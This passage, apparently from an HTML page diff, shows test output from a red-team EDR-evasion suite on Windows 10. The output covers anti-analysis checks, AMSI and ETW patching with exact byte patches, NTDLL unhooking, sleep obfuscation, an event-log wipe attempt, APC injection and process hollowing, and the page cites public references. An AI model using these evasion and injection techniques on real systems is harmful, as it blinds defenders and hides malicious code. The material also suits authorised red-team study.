+    <div class="result-card"><div class="result-score score-pass">2/2</div><div class="result-label">Crypto</div></div>
+  </div>
+
+  <div class="callout callout-note">
+    <strong>On the "failures"</strong>
+    Heap ForceFlags (0x194) and CPUID "VMwareVMware" both triggered because the test machine is a VMware VM — correct detections, not broken code. PAGE_GUARD found 3 regions: these are normal thread stack guard pages, not EDR watchpoints. Event log wipe failed with ACCESS_DENIED: needs an elevated token, which is expected in a non-admin context.
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Full run · Windows 10 x64 · MSVC 19.50 · SDK 10.0.26100.0</div>
+<pre><code><span class="t-head">── LAYER 1: ANTI-ANALYSIS ──</span>
+<span class="t-pass">[PASS]</span> PEB.BeingDebugged = 0  [clean]
+<span class="t-pass">[PASS]</span> NtGlobalFlag = 0x0  [clean]
+<span class="t-fail">[FAIL]</span> Heap ForceFlags = 0x194  [VMware debug heap — correct VM detection]
+<span class="t-pass">[PASS]</span> DR0-DR3 = 0  [no hardware breakpoints]
+<span class="t-info">[INFO]</span> RDTSC delta = 135 cycles
+<span class="t-pass">[PASS]</span> RDTSC timing nominal
+<span class="t-info">[INFO]</span> Hypervisor vendor: "VMwareVMware"
+<span class="t-fail">[FAIL]</span> CPUID: known sandbox hypervisor detected [correct]
+<span class="t-info">[INFO]</span> Resolution: 1701x920  |  Processors: 2
+<span class="t-pass">[PASS]</span> No sandbox artifacts
+
+<span class="t-head">── LAYER 2: EVASION ──</span>
+<span class="t-info">[INFO]</span> AmsiScanBuffer: 4C 8B DC 49 → 31 C0 C3 49
+<span class="t-pass">[PASS]</span> AMSI patched
+<span class="t-info">[INFO]</span> EtwEventWrite:  4C 8B DC 48 → C3 8B DC 48
+<span class="t-pass">[PASS]</span> ETW patched
+<span class="t-info">[INFO]</span> .text 0x119200 bytes restored
+<span class="t-pass">[PASS]</span> NTDLL .text restored
+
+<span class="t-head">── LAYER 2d: ADVANCED EVASION ──</span>
+<span class="t-info">[INFO]</span> XOR 0xAB + PAGE_NOACCESS — sleeping 500 ms
+<span class="t-info">[INFO]</span> Round-trip: 4096 bytes verified
+<span class="t-pass">[PASS]</span> Ekko sleep obfuscation
+<span class="t-info">[INFO]</span> PAGE_GUARD scan: 3 regions (thread stack guards — normal)
+<span class="t-fail">[FAIL]</span> PAGE_GUARD: detected (stack guards — not EDR watchpoints)
+<span class="t-info">[INFO]</span> Event log: ERROR 5 (access denied — not admin)
+<span class="t-fail">[FAIL]</span> Event log wipe: requires elevation
+
+<span class="t-head">── LAYER 2: SYSCALL RESOLUTION ──</span>
+<span class="t-pass">[PASS]</span> 10/10 resolved  |  9/10 match 22H2 table
+
+<span class="t-head">── LAYER 3: INJECTION ──</span>
+<span class="t-info">[INFO]</span> APC target exited: <span class="t-pass">0x0000BEEF</span> ✓
+<span class="t-pass">[PASS]</span> Early Bird APC confirmed
+<span class="t-info">[INFO]</span> Hollowing target exited: <span class="t-pass">0x0000BEEF</span> ✓
+<span class="t-pass">[PASS]</span> Process Hollowing (RIP hijack) confirmed
+
+<span class="t-head">── LAYER 4: CRYPTOGRAPHY ──</span>
+<span class="t-info">[INFO]</span> AES-256-GCM tag: 5E ED BA 02 ... | Decrypted: "EDR-EVASION-TEST-PAYLOAD"
+<span class="t-pass">[PASS]</span> AES-256-GCM round-trip verified
+<span class="t-info">[INFO]</span> PBKDF2-SHA256 100k: A6A27B8D 33FC1150 3B5B9820 48933CCF ...
+<span class="t-pass">[PASS]</span> Environment-bound key derived</code></pre>
+  </div>
+</section>
+
+</div>
+</article>
+
+<footer>
+  <div class="container">
+    <p>All compiled code tested on Windows 10 x64. For authorized security research and red-team education only.</p>
+    <p style="margin-top:8px">References: <a href="https://j00ru.vexillium.org/syscalls/nt/64/" target="_blank">j00ru syscall table</a> · <a href="https://github.com/5pider/Ekko" target="_blank">Ekko (5pider)</a> · <a href="https://github.com/am0nsec/HellsGate" target="_blank">Hell's Gate (smelly__vx / am0nsec)</a> · <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf" target="_blank">Process Doppelgänging (Liberman &amp; Kogan)</a></p>
+  </div>
+</footer>
